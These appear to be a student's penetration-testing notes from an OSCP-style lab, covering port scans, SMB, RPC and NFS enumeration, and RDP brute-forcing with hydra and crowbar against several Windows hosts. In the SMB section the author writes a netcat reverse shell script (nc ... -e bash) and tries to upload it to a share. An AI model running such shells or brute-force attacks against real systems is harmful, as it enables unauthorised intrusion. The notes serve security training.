	443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
	|_ssl-date: 2023-09-15T12:53:42+00:00; -52d05h02m20s from scanner time.
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-generator: Nicepage 5.13.1, nicepage.com
	| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
	| Issuer: commonName=PowerShellWebAccessTestWebSite
	| Public Key type: rsa
	| Public Key bits: 1024
	| Signature Algorithm: sha1WithRSAEncryption
	| Not valid before: 2023-08-24T08:19:45
	| Not valid after:  2023-11-22T08:19:45
	| MD5:   ce5f:2697:4f6f:429e:f052:4186:6f96:948c
	|_SHA-1: ba7e:919b:1a3f:953c:475e:9408:75c1:8b41:9f15:8293
	|_http-server-header: Microsoft-IIS/10.0
	| tls-alpn: 
	|_  http/1.1
	445/tcp  open  microsoft-ds?
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	| ssl-cert: Subject: commonName=oscp
	| Issuer: commonName=oscp
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2023-08-10T09:07:03
	| Not valid after:  2024-02-09T09:07:03
	| MD5:   e99d:8341:a0af:07a1:a945:cca6:313b:31ca
	|_SHA-1: 6d48:86da:9152:5489:1009:ea14:962a:eab3:8b64:bf4b
	|_ssl-date: 2023-09-15T12:53:42+00:00; -52d05h02m20s from scanner time.
	| rdp-ntlm-info: 
	|   Target_Name: OSCP
	|   NetBIOS_Domain_Name: OSCP
	|   NetBIOS_Computer_Name: OSCP
	|   DNS_Domain_Name: oscp
	|   DNS_Computer_Name: oscp
	|   Product_Version: 10.0.17763
	|_  System_Time: 2023-09-15T12:53:00+00:00
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	Host script results:
	|_clock-skew: mean: -52d05h02m20s, deviation: 0s, median: -52d05h02m20s
	| smb2-time: 
	|   date: 2023-09-15T12:53:02
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required

Possibly broke some servers with rustscan so will revert and try a `-T4` scan with nmap

```sh
enum4linux -a 192.168.128.111
```
	No results

### Port 80 - Web - Static Website
	80/tcp   open  http          Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-generator: Nicepage 5.13.1, nicepage.com
	|_http-title: Home

![[Pasted image 20231106210125.png]]
Solar static generated site from https://nicepage.com/static-site-generator

target URL: http://192.168.128.111
```sh
dirbuster
```
wordlist is in `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![[Pasted image 20231106210346.png]]
Looks like just static pages

Sub-directory checks


### Port 135 - Unknown App Data Channel - No Scan Results 
135/tcp  open  msrpc         Microsoft Windows RPC

Null session
```
rpcclient -U "" 192.168.128.111
```
	Password for [WORKGROUP\]: (NONE/NULL)
	rpcclient $>

Server Type
```rpcclient
srvinfo
```
	192.168.128.111Wk Sv NT SNT         
	platform_id     :       500
	os version      :       10.0
	server type     :       0x9003

Enumerate Users
```rpcclient
enumdomusers
enumdomgroups
```
	result was NT_STATUS_CONNECTION_DISCONNECTED
Nope

Resources:
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
### Port 139 - Netbios or Samba Legacy
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

Check SMB service & enumerate shares and check for eternal blue
```sh
sudo nmap -sU -sV -T5 --script=nbstat.nse -p139 -Pn -n 192.168.128.111
```

```
nmblookup -A 192.168.128.111
```
	No reply from 192.168.128.111

```
nbtscan 192.168.128.111/30
```
	No results


`smbmap` Guest & null checks

Null
```
smbmap -H 192.168.128.111 -P 139
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s) 

Guest
```
smbmap -H 192.168.128.111 -u guest -p "" -P 139
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s)

`smbclient` Guest and null checks

Null
```sh
smbclient -L 192.168.128.111 -p 139
```
	do_connect: Connection to 192.168.128.111 failed (ErrorNT_STATUS_RESOURCE_NAME_NOT_FOUND)

Guest
```sh
smbclient -L 192.168.128.111 -p 139 --user guest
```

### Port 443 - Encrypted Web - Static Website - No Vulns
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2023-09-15T12:53:42+00:00; -52d05h02m20s from scanner time.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 5.13.1, nicepage.com
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Issuer: commonName=PowerShellWebAccessTestWebSite
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-08-24T08:19:45
| Not valid after:  2023-11-22T08:19:45
| MD5:   ce5f:2697:4f6f:429e:f052:4186:6f96:948c
|_SHA-1: ba7e:919b:1a3f:953c:475e:9408:75c1:8b41:9f15:8293
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1

![[Pasted image 20231106210218.png]]
Also the same website but served on a bad cert https

target URL: https://192.168.128.111
```sh
dirbuster
```
wordlist is in `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![[Pasted image 20231106210409.png]]
More of the same
### Port 445 - Samba / SMB - Manual Enumeration
445/tcp  open  microsoft-ds?

run nmap scripts for smb services which enumerates shares and checks for eternal blue
```sh
nmap -p445 -T4 --script=smb-enum-shares,smb-enum-users --open 139,445 -v -oN smb445.nmap
```

`smbmap` check for guest and null

Null
```sh
smbmap -H 192.168.128.111 
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s)

Guest
```sh
smbmap -H 192.168.128.111 -u guest -p ""
```
	[*] Detected 1 hosts serving SMB
	[*] Established 1 SMB session(s)                                
	[!] Bummer:  cannot access local variable 'priv_status' where it is not associated with a value

smbclient null and guest connections 

guest works
```
smbclient -L 192.168.128.111               
```
	Password for [WORKGROUP\kali]: (none)
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	AnneAuto        Disk      Anne's Automatic BackUps
	              Disk      Default share
	IPC$            IPC       Remote IPC
	Reconnecting with SMB1 for workgroup listing.
	do_connect: Connection to 192.168.128.111 failed (Error 
	NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Unable to connect with SMB1 -- no workgroup available
SMB1 fails so likely not Eternal Blue

User is likely `anne`

Trying connections to each one

Also can connect through file manager
```
smb://192.168.128.111/AnneAuto
```
![[Pasted image 20231107022157.png]]
Use bash to leave the $ in the name
```
smbclient "//192.168.128.111/ADMIN\$" -U guest
```
	Password for [WORKGROUP\guest]:
	tree connect failed: NT_STATUS_ACCESS_DENIED

#### IPC$

```
smbclient -U guest "//192.168.128.111/IPC\$"
```
Connected

Download everything from the SMB share to the current directory
```smb
mask ""
```

```smb
recurse
```

```smb
prompt
```

```smb
mget *
```
	No files

Try to add the rev.sh to the share
	No perms

#### AnneAuto
Null
```
smbclient //192.168.128.111/AnneAuto
```

Guest
```sh
smbclient -U guest //192.168.128.111/AnneAuto
```

**Connected. Null & Guest both work.** 

Download everything from the SMB share to the current directory
```smb
mask ""
```

```smb
recurse
```

```smb
prompt
```

```smb
mget *
```

Now to validate, unzip
```sh
file emails.zip
```

```
unzip emails.zip && cd emails
```

Now view everything
```sh
ls -altR
```
	.:
	total 20
	drwxr-xr-x 3 kali kali 4096 Nov  7 01:55 ../
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ./
	drwxr-xr-x 2 kali kali 4096 Jul 27 04:25 2023_Week38/
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:13 2023_Week40/
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:11 2023_Week39/
	./2023_Week38:
	total 8
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ../
	drwxr-xr-x 2 kali kali 4096 Jul 27 04:25 ./
	./2023_Week40:
	total 8
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ../
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:13 ./
	./2023_Week39:
	total 8
	drwxr-xr-x 5 kali kali 4096 Aug 24 09:41 ../
	drwxr-xr-x 2 kali kali 4096 Jul 20 08:11 ./

```sh
tree
```
	.                                                      
	├── 2023_Week38                                        
	├── 2023_Week39                                        
	└── 2023_Week40                                        
	4 directories, 0 files

It's empty.

Testing write access on the share by prepping a reverse shell script on `/tmp` and sending it to the share

```sh
echo "#!/bin/sh
nc 192.168.48.128 4444 -e bash" > rev.sh
```

set permissions
```sh
chmod +x rev.sh && chmod 777 rev.sh
```

now mount the samba share to add it to the folder
```sh
sudo mount -t cifs -o rw,noexec //192.168.128.111/AnneAuto /tmp/anne
```

```sh
sudp cp rev.sh anne/
```
	cp: cannot create regular file 'anne/rev.sh': Permission denied

Sources:
- https://www.systranbox.com/how-to-connect-to-smb-using-guest-account-kali-linux/
- https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
### Port 3389 - RDP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Issuer: commonName=oscp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-10T09:07:03
| Not valid after:  2024-02-09T09:07:03
| MD5:   e99d:8341:a0af:07a1:a945:cca6:313b:31ca
|_SHA-1: 6d48:86da:9152:5489:1009:ea14:962a:eab3:8b64:bf4b
|_ssl-date: 2023-09-15T12:53:42+00:00; -52d05h02m20s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.17763
|_  System_Time: 2023-09-15T12:53:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```sh
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 192.168.128.111
```
	PORT     STATE SERVICE 
	3389/tcp open  ms-wbt-server
	| rdp-enum-encryption: 
	|   Security layer  
	|     CredSSP (NLA): SUCCESS
	|     CredSSP with Early User Auth: SUCCESS 
	|_    RDSTLS: SUCCESS 


Go for a RDP bruteforce with hydra
Using `xhydra` to craft the command

```
hydra -s 3389 -V -l oscp -P /usr/share/wordlists/rockyou.txt -t 1 -W 1 192.168.128.111 rdp
```
Crashed out. More stable RDP bruteforcer I'm sure

Crowbar
```
crowbar -b rdp -s 192.168.128.111 -u oscp -C /usr/share/wordlists/rockyou.txt
```

## 192.168.128.124 - Linux
### Prep
Target IP  given

Set up a directory for the target and enter it
```sh
mkdir Target1-192.168.128.124
cd Target1-192.168.128.124
```

### Recon
Start with a quick open port scan
```sh
rustscan 192.168.128.124
```
	Open 192.168.128.124:22
	Open 192.168.128.124:111
	Open 192.168.128.124:135
	Open 192.168.128.124:445
	Open 192.168.128.124:2049
	Open 192.168.128.124:5357

Quick OS check
```sh
sudo nmap -O -Pn --top-ports 2000 -v -T5 192.168.128.124 -oN osType.nmap
```


Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -p22,111,135,445,2049,5357 -Pn -T5 192.168.128.124 -oN 192.168.128.124-Services.nmap
```
	PORT     STATE SERVICE       VERSION
	22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 5f:03:a7:a0:a6:92:ca:5d:76:26:93:d5:a2:dd:a9:68 (RSA)
	|   256 25:61:b8:36:9f:11:a0:5d:4f:02:6a:66:a6:f9:ce:19 (ECDSA)
	|_  256 c0:52:60:d1:a7:13:25:ce:12:24:c8:c0:f6:3d:52:94 (ED25519)
	111/tcp  open  rpcbind       2-4 (RPC #100000)
	| rpcinfo: 
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/tcp6  rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100000  2,3,4        111/udp6  rpcbind
	|   100003  2,3         2049/udp   nfs
	|   100003  2,3         2049/udp6  nfs
	|   100003  2,3,4       2049/tcp   nfs
	|   100003  2,3,4       2049/tcp6  nfs
	|   100005  1,2,3       2049/tcp   mountd
	|   100005  1,2,3       2049/tcp6  mountd
	|   100005  1,2,3       2049/udp   mountd
	|   100005  1,2,3       2049/udp6  mountd
	|   100021  1,2,3,4     2049/tcp   nlockmgr
	|   100021  1,2,3,4     2049/tcp6  nlockmgr
	|   100021  1,2,3,4     2049/udp   nlockmgr
	|   100021  1,2,3,4     2049/udp6  nlockmgr
	|   100024  1           2049/tcp   status
	|   100024  1           2049/tcp6  status
	|   100024  1           2049/udp   status
	|_  100024  1           2049/udp6  status
	135/tcp  open  msrpc         Microsoft Windows RPC
	445/tcp  open  microsoft-ds?
	2049/tcp open  nlockmgr      1-4 (RPC #100021)
	5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Service Unavailable
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2022-10-26T13:27:17
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	|_clock-skew: -376d04h32m42s

### Port 22 - SSH
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5f:03:a7:a0:a6:92:ca:5d:76:26:93:d5:a2:dd:a9:68 (RSA)
|   256 25:61:b8:36:9f:11:a0:5d:4f:02:6a:66:a6:f9:ce:19 (ECDSA)
|_  256 c0:52:60:d1:a7:13:25:ce:12:24:c8:c0:f6:3d:52:94 (ED25519)

### Port 111 - Data Channel 
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status

guest
```sh
rpcclient -U 'guest' 192.168.128.124
```
	Password for [WORKGROUP\guest]:
	Cannot connect to server.  Error was NT_STATUS_ACCOUNT_DISABLED

Null
```sh
rpcclient -U '' 192.168.128.124
```
	Password for [WORKGROUP\]:
	Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

### Port 135
135/tcp  open  msrpc         Microsoft Windows RPC

```sh
rpcclient -U '%' -N 192.168.128.124 
```
	Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

### Port 445 - Samba / SMB
445/tcp  open  microsoft-ds?

```sh
nmap -Pn -p445 -T5 --script=smb-vuln-ms17-010,smb-enum-shares,smb-enum-users,smb-enum-domains,smb-brute --open 192.168.128.124 -v -oN smbScripts.nmap
```

smbmap

```sh
smbmap -H 192.168.128.124 
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s)

Trying null session

```
smbclient -L 192.168.128.124
```
	Password for [WORKGROUP\kali]: (none)
		session setup failed: NT_STATUS_ACCESS_DENIED


### Port 2049 - NFS
2049/tcp open  nlockmgr      1-4 (RPC #100021)

nmap nfs check script

```sh
nmap -Pn -p2049 -T5 --script=nfs-showmount,nfs-ls --open 192.168.128.124 -v -oN nfs.nmap
```

check remote mounts manually if nmap doesn't return results
```sh
showmount -e 192.168.128.124
```
	Export list for 192.168.128.124:
	/BackUp (everyone)

They have a open `/Backups` nfs mount

Create a tmp directory to mount it for easy locating
```sh
mkdir /tmp/backup
```

Now to mount it
```sh
sudo mount -o row,noexec 192.168.128.124:/BackUp /tmp/backup
```

Seems to be version 3 since 2 fails

Verify new mount
```sh
df -k
```
![[Pasted image 20231107042543.png]]

Still has permissions error
```sh
ls -alt | grep backup         
```                                                    
	drwx------  2 nobody nogroup     64 Aug 29  2022 **124**

![[Pasted image 20231107000409.png]]

When moving into the directory I get a permission error so become root
```sh
sudo su
```
Now I can list the directory
![[Pasted image 20231107000521.png]]

Backups of 2022-2022 exist and they are sql tables
![[Pasted image 20231107000906.png]]
User tables will be where the password hashes would be. Will check latest year for best success rate.

![[Pasted image 20231107001248.png]]
So the site was wordpress before. Likely got hacked then they switched to a new one.

![[Pasted image 20231107001330.png]]
2022 doesn't have user tables so 2020 is the best one.

change ownership so the files work with kali in each year's directory

```sh
sudo chown kali * 
```

Now to read the `UserTables` and the databases. 
![[Pasted image 20231107002807.png]]
Possibly corrupted zip?

Either zip repair or parse manually
```
strings UserTables.zip
```
Returns nothing decrypted. Omitted for readability

Attempt to fix zip archive 

```sh
zip -FF UserTables.zip --out FixedUserTables.zip
```
	Fix archive (-FF) - salvage what can
	        zip warning: Missing end (EOCDR) signature - either this archive
	                     is not readable or the end is damaged
	Is this a single-disk archive?  (y/n): y
	  Assuming single-disk archive
	Scanning for entries...
	        zip warning: zip file empty

Problems with the files

- Import into SQLite and dbeaver don't recognize it as a database.
- Strings on all files have it seem that they're corrupted
- Images aren't viewable via gwenview 

Brute-forcing all the files I find that the wordpress.zip is the only non fake file in the lot
![[Pasted image 20231107005505.png]]

so I unzip and start moving through the wordpress backup
```sh
unzip wordpress.zip && cd wordpress
```

Swinging through the trees of this backup to look for users or passwords but there are no files

```sh
tree
```
	554 directories, 0 files

Fast check for legit files
```sh
cd /"2020 Backup"
file *
```
	db_export-jan+feb.sql:   data
	db_export-july+aug.sql:  data
	db_export-mar+april.sql: data
	db_export-may+june.sql:  data
	db_export-nov+dec.sql:   data
	db_export-sep+oct.sql:   data
	promo.png:               data
	UserTables.zip:          data

```sh
cd /"2022 Backup"
file *
```
	logo.png:            data
	new-logo.png:        data
	old_site_backup.zip: Zip archive data, at least v2.0 to extract, compression 
	method=store
	Site_Export_1.txt:   data
	Site_Export_2.txt:   OpenPGP Public Key
	Site_Export_3.txt:   data

So old site actual backup and a Open PGP public key are here.

```sh
unzip old_site_backup.zip
```
	seems to be a wordpress

```
cd wordpress && tree
```
	534 directories, 0 files

Checking ability to write to the share to run a script from there
```
touch test.sh
```
	touch: cannot touch 'test.sh': Permission denied

Try to take ownership
```sh
cd .. && chown root backup
```
	chown: changing ownership of 'backup': Permission denied


https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#nfs-port-2049
### Port 5357 - Web Server - No web pages
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

![[Pasted image 20231106220841.png]]

target URL: http://192.168.128.124:5357
```sh
dirbuster
```
wordlist is in `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![[Pasted image 20231106221259.png]]

This far in with no results the server isn't working or there's nothing there.

Trying with Nikto

```
nikto -port 5357 -host 192.168.128.124
```
	- Nikto v2.5.0
	---------------------------------------------------------------------------
	+ Target IP:          192.168.128.124
	+ Target Hostname:    192.168.128.124
	+ Target Port:        5357
	+ Start Time:         2023-11-06 22:58:36 (GMT0)
	---------------------------------------------------------------------------
	+ Server: Microsoft-HTTPAPI/2.0
	+ /: The anti-clickjacking X-Frame-Options header is not present. See: 
	+ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
	+ /: The X-Content-Type-Options header is not set. This could allow the user 
	+ agent to render the content of the site in a different fashion to the MIME 
	+ type. See: https://www.netsparker.com/web-vulnerability-
	+ scanner/vulnerabilities/missing-content-type-header/
	+ No CGI Directories found (use '-C all' to force check all possible dirs)

Nothing
# Active Directory Network

Resources:
- https://xmind.app/m/vQuTSG/
## 192.168.128.101 - MS01 - Entry Point

### Prep
Target IP Given

set up a directory for the target and enter it

```sh
mkdir Target1-192.168.x.x
cd Target1-192.168.x.x
```
### Recon
Start with a quick open port scan. Running both since there's a chance the other two can only be accessed from a jump point. Also nmap is so slow
```sh
rustscan 192.168.x.x
	```
	PORT      STATE SERVICE       REASON
	21/tcp    open  ftp           syn-ack
	80/tcp    open  http          syn-ack
	135/tcp   open  msrpc         syn-ack
	139/tcp   open  netbios-ssn   syn-ack
	445/tcp   open  microsoft-ds  syn-ack
	3389/tcp  open  ms-wbt-server syn-ack
	5040/tcp  open  unknown       syn-ack
	8080/tcp  open  http-proxy    syn-ack
	9510/tcp  open  unknown       syn-ack
	9512/tcp  open  unknown       syn-ack
	9595/tcp  open  pds           syn-ack
	49664/tcp open  unknown       syn-ack
	49665/tcp open  unknown       syn-ack
	49666/tcp open  unknown       syn-ack
	49667/tcp open  unknown       syn-ack
	49668/tcp open  unknown       syn-ack
	49669/tcp open  unknown       syn-ack
	49670/tcp open  unknown       syn-ack
	49671/tcp open  unknown       syn-ack
	51393/tcp open  unknown       syn-ack

```sh
sudo nmap -O -Pn --top-ports 100 -T5 192.168.128.101 --open -oN osType.nmap
```
	Aggressive OS guesses: Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 (91%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2019 (91%), Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2008 SP1 (89%), Microsoft Windows 10 (88%), Microsoft Windows 7 or Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (88%)
	No exact OS matches for host (test conditions non-ideal).

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -p21,80,135,139,445,3389,5040,8080,9510,9512,9595,49664,49665,49666,49667,49668,49669,49670,49671,51393 -v -T5 192.168.128.101 -oN services.nmap
```
	PORT      STATE SERVICE       VERSION
	21/tcp    open  ftp           Microsoft ftpd
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_03-21-22  01:45AM             38100936 ServerSetup-3.9.0.2463.exe
	| ftp-syst: 
	|_  SYST: Windows_NT
	80/tcp    open  http          Microsoft IIS httpd 10.0
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	|_ssl-date: 2023-11-06T18:19:39+00:00; 0s from scanner time.
	| ssl-cert: Subject: commonName=MS01.oscp.exam
	| Issuer: commonName=MS01.oscp.exam
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2023-11-05T17:19:05
	| Not valid after:  2024-05-06T17:19:05
	| MD5:   bbd6:3041:aa23:79dc:03e6:362b:eb54:9cfc
	|_SHA-1: 72b2:0234:ca40:c40e:0723:78c0:5c1d:d4d2:5616:568f
	| rdp-ntlm-info: 
	|   Target_Name: OSCP
	|   NetBIOS_Domain_Name: OSCP
	|   NetBIOS_Computer_Name: MS01
	|   DNS_Domain_Name: oscp.exam
	|   DNS_Computer_Name: MS01.oscp.exam
	|   DNS_Tree_Name: oscp.exam
	|   Product_Version: 10.0.19041
	|_  System_Time: 2023-11-06T18:19:03+00:00
	5040/tcp  open  unknown
	8080/tcp  open  http          Microsoft IIS httpd 10.0
	|_http-open-proxy: Proxy might be redirecting requests
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	9510/tcp  open  rtsp
	|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.0 404 Not Found
	|     Date: Mon, 06 Nov 2023 18:16:23 GMT
	|     Connection: Close
	|     Cache-Control: no-cache, no-store, must-revalidate
	|     Pragma: no-cache
	|     Expires: 0
	|     Content-Type: text/html
	|     <h1>Not Found (404)</h1>
	|     <p>/nice%20ports%2C/Tri%6Eity.txt%2ebak</p>
	|   GenericLines: 
	|     HTTP/1.1 400 Bad Request
	|     Connection: Close
	|   GetRequest: 
	|     HTTP/1.0 404 Not Found
	|     Date: Mon, 06 Nov 2023 18:16:22 GMT
	|     Connection: Close
	|     Content-Type: text/html
	|     <h1>Not Found (404)</h1>
	|     <p>/</p>
	|   HTTPOptions: 
	|     HTTP/1.0 404 Not Found
	|     Date: Mon, 06 Nov 2023 18:16:23 GMT
	|     Connection: Close
	|     Content-Type: text/html
	|     <h1>Not Found (404)</h1>
	|     <p>/</p>
	|   RTSPRequest: 
	|     RTSP/1.0 404 Not Found
	|     Date: Mon, 06 Nov 2023 18:16:23 GMT
	|     Connection: Close
	|     Content-Type: text/html
	|     <h1>Not Found (404)</h1>
	|     <p>/</p>
	|   SIPOptions: 
	|     SIP/2.0 404 Not Found
	|     Date: Mon, 06 Nov 2023 18:16:23 GMT
	|     Connection: Close
	|     Cache-Control: no-cache, no-store, must-revalidate
	|     Pragma: no-cache
	|     Expires: 0
	|     Content-Type: text/html
	|     <h1>Not Found (404)</h1>
	|_    <p>sip:nm</p>
	9512/tcp  open  unknown
	9595/tcp  open  pds?
	| fingerprint-strings: 
	|   NotesRPC: 
	|     Action
	|     Password
	|     Session
	|     dd666dca-7cd0-11ee-830b-0050568a5552
	|     Action
	|     Password
	|     Session
	|     dd68d02e-7cd0-11ee-abff-0050568a5552
	|     Action
	|     Password
	|     Session
	|     dd68d030-7cd0-11ee-9dec-0050568a5552
	|     Action
	|     Password
	|     Session
	|     dd6b3288-7cd0-11ee-9573-0050568a5552
	|     Action
	|     Password
	|     Session
	|     dd6b3289-7cd0-11ee-9770-0050568a5552
	|     Action
	|     Password
	|     Session
	|     dd6b328a-7cd0-11ee-97f9-0050568a5552
	|     Action
	|     Password
	|     Session
	|     dd6d94d8-7cd0-11ee-a97e-0050568a5552
	|     Action
	|     Password
	|     Session
	|_    dd6d94d9-7cd0-11ee-883f-0050568a5552
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
	51393/tcp open  msrpc         Microsoft Windows RPC
	2 services unrecognized despite returning data. If you know the 
	service/version, please submit the following fingerprints at 
	https://nmap.org/cgi-bin/submit.cgi?new-service :
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	SF-Port9510-TCP:V=7.94%I=7%D=11/6%Time=65492D76%P=x86_64-pc-linux-gnu%r(Ge
	SF:nericLines,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20Clo
	SF:se\r\n\r\n")%r(GetRequest,8D,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:
	SF:\x20Mon,\x2006\x20Nov\x202023\x2018:16:22\x20GMT\r\nConnection:\x20Clos
	SF:e\r\nContent-Type:\x20text/html\r\n\r\n<h1>Not\x20Found\x20\(404\)</h1>
	SF:\n<p>/</p>\n")%r(HTTPOptions,8D,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDa
	SF:te:\x20Mon,\x2006\x20Nov\x202023\x2018:16:23\x20GMT\r\nConnection:\x20C
	SF:lose\r\nContent-Type:\x20text/html\r\n\r\n<h1>Not\x20Found\x20\(404\)</
	SF:h1>\n<p>/</p>\n")%r(RTSPRequest,8D,"RTSP/1\.0\x20404\x20Not\x20Found\r\
	SF:nDate:\x20Mon,\x2006\x20Nov\x202023\x2018:16:23\x20GMT\r\nConnection:\x
	SF:20Close\r\nContent-Type:\x20text/html\r\n\r\n<h1>Not\x20Found\x20\(404\
	SF:)</h1>\n<p>/</p>\n")%r(FourOhFourRequest,102,"HTTP/1\.0\x20404\x20Not\x
	SF:20Found\r\nDate:\x20Mon,\x2006\x20Nov\x202023\x2018:16:23\x20GMT\r\nCon
	SF:nection:\x20Close\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-r
	SF:evalidate\r\nPragma:\x20no-cache\r\nExpires:\x200\r\nContent-Type:\x20t
	SF:ext/html\r\n\r\n<h1>Not\x20Found\x20\(404\)</h1>\n<p>/nice%20ports%2C/T
	SF:ri%6Eity\.txt%2ebak</p>\n")%r(SIPOptions,E3,"SIP/2\.0\x20404\x20Not\x20
	SF:Found\r\nDate:\x20Mon,\x2006\x20Nov\x202023\x2018:16:23\x20GMT\r\nConne
	SF:ction:\x20Close\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-rev
	SF:alidate\r\nPragma:\x20no-cache\r\nExpires:\x200\r\nContent-Type:\x20tex
